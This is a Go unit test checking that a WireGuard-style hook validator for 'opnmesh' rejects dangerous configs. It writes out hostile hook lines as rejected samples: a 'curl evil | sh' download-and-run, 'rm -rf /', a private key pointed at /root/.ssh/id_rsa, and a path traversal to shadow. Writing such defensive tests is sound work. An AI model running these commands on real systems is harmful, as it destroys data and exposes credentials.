func TestValidateHooks(t *testing.T) {
	if err := validateHooks(sampleConf, "/etc/opnmesh"); err != nil {
		t.Fatalf("sanctioned PostUp rejected: %v", err)
	}
	bad := []string{
		"[Interface]\nPostUp = wg set %i private-key /etc/opnmesh/private.key; curl evil | sh\n",
		"[Interface]\nPreUp = /bin/true\n",
		"[Interface]\nPostDown = rm -rf /\n",
		"[Interface]\nPostUp = wg set %i private-key /root/.ssh/id_rsa\n",
		"[Interface]\nPostUp = wg set %i private-key /etc/opnmesh/../shadow\n",
		"[Interface]\nPrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n",
	}
	for _, c := range bad {
		if err := validateHooks(c, "/etc/opnmesh"); err == nil {
			t.Errorf("accepted dangerous config:\n%s", c)
		}
	}
}

